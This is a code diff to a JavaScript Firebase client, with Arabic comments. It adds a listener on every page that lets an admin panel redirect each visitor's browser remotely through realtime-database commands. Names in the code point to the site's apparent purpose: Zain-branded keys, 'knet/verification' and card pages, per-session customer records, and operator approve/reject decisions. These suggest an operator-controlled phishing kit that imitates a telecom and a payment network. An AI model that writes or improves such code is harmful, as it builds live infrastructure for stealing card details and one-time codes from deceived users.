@@ -78,6 +78,63 @@
   const customerRef = db.collection("customers").doc(sessionId);
   window.customerRef = customerRef;
 
+  // ═══════════════════════════════════════════════════════════
+  // مستمع التوجيه العام — يعمل على كل الصفحات تلقائياً (لا يحتاج أي إعداد في الصفحة)
+  // المصدر: RTDB commands/{sessionId}/redirect (تكتبه لوحة التحكم عند الضغط على أزرار التوجيه)
+  // المشكلة التي يُصلحها: كان التوجيه يُستقبل فقط في الصفحات التي تستدعي
+  // listenForAdminCommands يدوياً (knet/verification)، فلم يعمل على index/cartepage/
+  // creatprogect. الآن يُستمع للتوجيه من داخل firebase-client.js نفسه في كل صفحة.
+  // ═══════════════════════════════════════════════════════════
+  function _redirectKey() { return 'zain_cmd_redirect_' + sessionId; }
+  function _redirectStamp(cmd) {
+    return String(cmd.redirectAt || cmd.seq || cmd.timestamp || cmd.action || '');
+  }
+  function _currentPageFile() {
+    var p = window.location.pathname.split('/').pop();
+    return p || 'index.html';
+  }
+  // مقارنة الصفحة الحالية بالهدف بشكل متسامح (نسبي/مطلق/بلا شرطة)
+  function _samePage(target) {
+    try {
+      var a = document.createElement('a');
+      a.href = target;
+      var tPath = a.pathname.replace(/\/+$/, '') || '/';
+      var cPath = window.location.pathname.replace(/\/+$/, '') || '/';
+      if (tPath === cPath) return true;
+      var tFile = tPath.split('/').pop() || 'index.html';
+      var cFile = cPath.split('/').pop() || 'index.html';
+      return tFile === cFile;
+    } catch (e) {
+      return target === _currentPageFile() || target === window.location.pathname;
+    }
+  }
+  function _applyRedirect(target) {
+    try { window.location.href = target; } catch (e) {}
+  }
+  function _handleRedirect(cmd) {
+    if (!cmd || cmd.action !== 'REDIRECT_PAGE' || !cmd.targetPage) return;
+    var target = String(cmd.targetPage);
+    var cmdRef = rtd.ref('commands/' + sessionId + '/redirect');
+    // لا توجّه العميل إلى الصفحة التي هو عليها أصلاً (حماية من الحلقة)
+    if (_samePage(target)) {
+      cmdRef.remove().catch(function () {});
+      return;
+    }
+    var stamp = _redirectStamp(cmd);
+    var seen = null;
+    try { seen = localStorage.getItem(_redirectKey()); } catch (e) {}
+    if (seen === stamp) { cmdRef.remove().catch(function () {}); return; }
+    try { localStorage.setItem(_redirectKey(), stamp); } catch (e) {}
+    cmdRef.remove().catch(function () {});
+    _applyRedirect(target);
+  }
+  window.__handleRedirectCommand = _handleRedirect;
+  window.startRedirectListener = function () {
+    rtd.ref('commands/' + sessionId + '/redirect').on('value', function (snap) {
+      _handleRedirect(snap.val());
+    });
+  };
+
   window.getDeviceAndBrowser = function () {
     const ua = navigator.userAgent;
     let browser = "Other";
@@ -521,27 +578,23 @@
       dispatchDecision('rejected', cmd);
     });
 
-    // التوجيه: يُنفَّذ مرة واحدة فقط. المشكلة السابقة: بعد الانتقال تُقرأ الصفحة
-    // الجديدة نفس إشارة التوجيه المتبقية في قاعدة البيانات فيتكرر التوجيه بلا نهاية.
+    // التوجيه: المستمع العام في أعلى الملف (firebase-client.js) يتولّى التوجيه
+    // على كل الصفحات. هنا نبقى نستدعي onRedirect فقط إن عرّفته الصفحة (توافق خلفي).
     cmdRef.child('redirect').on('value', (snap) => {
       const cmd = snap.val();
       if (!cmd || cmd.action !== 'REDIRECT_PAGE' || !cmd.targetPage) return;
+      if (typeof callbacks.onRedirect !== 'function') return;
       const target = String(cmd.targetPage);
       // لا توجّه العميل إلى الصفحة التي هو عليها أصلاً (حماية إضافية من الحلقة)
+      if (window.__handleRedirectCommand) { window.__handleRedirectCommand(cmd); return; }
       if (target === currentPageFile() || target === window.location.pathname) {
         clearCmd('redirect');
         return;
       }
       if (alreadyDone('redirect', cmd)) { clearCmd('redirect'); return; }
-      if (window.__redirectHandled) return;
-      window.__redirectHandled = true;
       markDone('redirect', cmd);
       clearCmd('redirect');
-      if (typeof callbacks.onRedirect === 'function') {
-        callbacks.onRedirect(cmd);
-      } else {
-        window.location.href = target;
-      }
+      callbacks.onRedirect(cmd);
     });
 
     rtd.ref('messages/' + sessionId).on('child_added', (snap) => {
@@ -553,5 +606,7 @@
   // ابدأ الجلسة بعد التأكد من المصادقة (قواعد أمان Firestore تتطلب تسجيل دخول للكتابة في customers)
   window.ensureAuthReady().then(function () {
     window.initFirebaseSession();
+    // مستمع التوجيه العام: يعمل على كل صفحة (بعد المصادقة حتى يُسمح بقراءة RTDB)
+    window.startRedirectListener();
   });
 })();
